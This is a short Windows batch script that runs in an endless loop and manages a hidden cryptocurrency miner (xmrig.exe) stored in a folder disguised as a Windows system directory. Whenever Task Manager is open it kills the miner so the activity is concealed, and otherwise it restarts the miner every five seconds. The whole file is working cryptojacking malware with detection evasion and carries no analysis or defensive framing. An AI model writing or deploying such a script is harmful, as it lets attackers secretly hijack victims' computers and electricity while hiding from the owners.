@echo off
:loop
tasklist | find /i "Taskmgr.exe" >nul
if %errorlevel%==0 (
    taskkill /f /im xmrig.exe >nul 2>&1
) else (
    tasklist | find /i "xmrig.exe" >nul
    if %errorlevel%==1 (
        start "" "C:\ProgramData\Microsoft\Windows\SystemData\Roulette\xmrig.exe"
    )
)
timeout /t 5 >nul
goto loop
